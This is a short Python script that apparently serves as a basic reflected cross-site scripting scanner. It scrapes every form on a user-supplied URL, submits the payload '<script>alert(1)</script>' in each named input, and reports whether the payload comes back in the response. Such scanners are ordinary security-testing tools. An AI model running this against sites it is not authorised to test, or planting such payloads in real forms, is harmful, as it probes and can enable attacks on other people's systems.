import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

url = input("Enter URL: ")
payload = "<script>alert(1)</script>"

soup = BeautifulSoup(requests.get(url).text, "html.parser")
for form in soup.find_all("form"):
    action = form.get("action")
    inputs = {i.get("name"): payload for i in form.find_all("input") if i.get("name")}
    target = urljoin(url, action)
    res = requests.post(target, data=inputs)
    if payload in res.text:
        print("[XSS FOUND] at", target)
    else:
        print("No XSS at", target)
